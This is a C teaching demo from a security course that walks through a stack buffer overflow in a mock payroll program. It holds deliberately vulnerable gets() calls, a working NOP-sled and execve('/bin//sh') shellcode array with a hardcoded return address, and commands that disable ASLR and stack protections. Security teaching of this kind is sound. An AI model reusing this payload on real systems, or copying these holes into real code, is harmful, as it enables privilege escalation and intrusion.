/* Mason Pitcher Michael Schmitt ECE498 Spring 2024
 * Vulnerable Program
 *
 * This will take user input and save "employee" info into the "database"
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

char attack[160] = {
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x31, 0xc0,
0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
0x50, 0x53, 0x89, 0xe1, 0x31, 0xd2, 0x31, 0xc0, 0xb0, 0x0b, 0xcd, 0x80, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x96, 0xce, 0xff, 0xff, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90
};

//0xed, 0x65, 0x55, 0x56,

struct Employee {
	char name[48];
	int id;
	int hours_worked;
};

void add_new_employee(struct Employee *database, int employee_count,
			int stack, char* attack);
void bof(char *attack);
int add_employee_hours(struct Employee *database);
void wait_for_enter(void);

void wait_for_enter(void)
{
	printf("Press <enter> to continue...");
	while(getchar() != '\n') {}
	/* this clears out the above line and makes it look nicer */
	printf("\033[F-------------------------------------\n\n");
}

void add_new_employee(struct Employee *database, int employee_count,
			int stack, char* attack)
{
	char name_input[100];

	printf("enter employee name: ");
	gets(name_input);

	if (stack) {
		printf("\nThese are the locations in memory of the buffer that\n"
			"we are trying to attack:\n");
		printf("\t\"add_new_employee()\" current return address: %p\n",
			__builtin_return_address(0));
		printf("\tframe base pointer: %p\n", __builtin_frame_address(0));
		printf("\tname_input[0] address: %p\n\n", &name_input[0]);

		wait_for_enter();

		for (int i = 159; i>=0; i--) {
			printf("name_input[%03d] @%p: %8x (%c) \tattack[%03d]: %8x (%c)\n",
				i, &name_input[i], name_input[i],
				(isgraph(name_input[i]) ? name_input[i] : ' ' ), 
				i, attack[i],
				(isgraph(attack[i]) ? attack[i] : ' ' ));
		}
		printf("\n\nbefore attack:\n\tfucntion return address: %p\n", __builtin_return_address(0));
		strncpy(name_input, attack, 160);
		printf("after attack:\n\tfunction return address: %p\n\n", __builtin_return_address(0));
		wait_for_enter();
	} else {
		database[employee_count].id = employee_count+1;
		database[employee_count].hours_worked = 0;
		strcpy(database[employee_count].name, name_input);
	}


	printf("welcome to work, %s! :3\n", name_input);
	
	return;	
}

int add_employee_hours(struct Employee *database) {
	char id_input[10];
	char hours_input[10];

	printf("enter employee id: ");
	gets(id_input);

	printf("how many hours today?: ");
	gets(hours_input);
	
	database[atoi(id_input)-1].hours_worked += atoi(hours_input);
	printf("total hours for %s: %d\n",
		database[atoi(id_input)-1].name,
		database[atoi(id_input)-1].hours_worked);

	return 0;
}

int main(void) {
	int i;
	int count;
	struct Employee database[10];
	printf( "\n\n\nThis program is a demo that shows the dangers of buffer\n"
		"overflow vulnerabilities, and how an attacker might get\n"
		"priveliged access to your system if they are clever.\n\n");
	wait_for_enter();
	printf( "First, we'll show an example vulnerable program, which will\n"
		"be a program to keep track of payroll at a company: you can\n"
		"type in employee names and the number of hours worked.\n\n");
	wait_for_enter();

	/****************** begin benign program ****************************/
	//printf("main ret addr: %p\n", __builtin_return_address(0));
	count = 0;
	while (count < 3) {
		add_new_employee(database, count, 0, attack);
		count += 1;
	}

	printf("employees: \n");
	for (i = 0; i<3; ++i) {
		printf("%d: %s\n", database[i].id, database[i].name);
	}

	printf("\n --- Time to enter hours :) ---\n");
	for (i = 0; i<3; i++) {
		add_employee_hours(database);
	}

	/****************** end benign program ****************************/

	printf("\n\n");
	wait_for_enter();

	/* explain why the code is dangerous */
	printf( "This code looks relatively harmless, but unfortunately\n"
		"the attacker has access to our source code! Take a look:\n\n");
	wait_for_enter();

	/* show truncated version of vulnerability */
	printf( "Here's the function they're interested in. Notice the use of\n"
		"the \"gets()\" function, labeled VERY BAD. This is a deprecated\n"
		"function in the standard library, because it allows user input\n"
		"to be written directly to memory without sanitation\n\n");
	printf(
		"void add_new_employee(struct Employee *database, int employee_count)\n"
		"{\n"
			"\tchar name_input[100];\n\n"

			"\tprintf(\"enter employee name: \");\n"
			"\tgets(name_input);     <---------------------------- VERY BAD\n\n"

			"\tdatabase[employee_count].id = employee_count+1;\n"
			"\tdatabase[employee_count].hours_worked = 0;\n"
			"\tstrcpy(database[employee_count].name, name_input);\n\n"

			"\tprintf(\"welcome to work, \\%%s! :3\\n\", name_input);\n\n"
			
			"\treturn;\n"
		"}\n\n"
	);

	wait_for_enter();

	/* explain why the code is dangerous, including which safety features
	 * need to be disabled */
	printf( "If the attacker carefully selects the right characters to\n"
		"enter into the program, they can overwrite values on the\n"
		"stack, which contains important bits of memory\n\n");
	wait_for_enter();

	/* print buffer diagram of "before attack" */

	/* show shellcode (compilation process/disassemble, plus actual bytes) */
	printf( "The \"payload\" code pasted into the timecard program will\n"
		"look something like this:\n\n");

	printf( "\txor     eax, eax    ; Clearing eax register\n"
		"\tpush    eax         ; Pushing NULL bytes\n"
		"\tpush    0x68732f2f  ; Pushing //sh\n"
		"\tpush    0x6e69622f  ; Pushing /bin\n"
		"\tmov     ebx, esp    ; ebx now has address of /bin//sh\n"
		"\tpush    eax         ; Pushing NULL byte\n"
		"\tmov     edx, esp    ; edx now has address of NULL byte\n"
		"\tpush    ebx         ; Pushing address of /bin//sh\n"
		"\tmov     ecx, esp    ; ecx now has address of address\n"
		"\t		       ; of /bin//sh byte\n"
		"\tmov     al, 11      ; syscall number of execve is 11\n"
		"\tint     0x80        ; Make the system call\n\n"
	);
	wait_for_enter();

	printf( "The code is written in assembly for the platform that is under\n"
		"attack: this allows the attacker to write very small but\n"
		"powerful programs that will fit inside the vulnerable program\n"
		"\n"
		"The payload will be compiled into machine code, and arranged\n"
		"in such a way that the currenly executing code will accidentally \n"
		"jump to the attacker's code.\n\n"
	);
	wait_for_enter();

	printf( "Importantly, for this demo we need to disable some compiler\n"
		"and operating system protections. These are usually enabled\n"
		"for us, due to how dangerous and prevalent these type of\n"
		"attacks are:\n"
		"\n"
		"We've already disabled address space randomization using:\n"
		"\n"
		"\t# sysctl -w kernel.randomize_va_space=0\n"
		"\n"
		"We've also allowed code on the stack to be executed and disabled\n"
		"some other compiler protections with the compiler flags:\n"
		"\n"
		"\t-z execstack -fno-stack-protector\n\n"
	);
	wait_for_enter();

	/* print buffer diagram of "after attack" */

	printf( "Finally, let's see the attack in action! We will call the\n"
		"function with the vulnerability, and use a global variable\n"
		"containing the pre-compiled payload to simulate the\n"
		"malicious code being injected using the \"gets()\" function\n"
		"\n"
		"Sit back and relax as the attacker opens a priveliged shell\n"
		"program on your computer ;)\n\n"
	);

	wait_for_enter();

	/* root shell */
	add_new_employee(database, count, 1, attack);

	return 0;
}
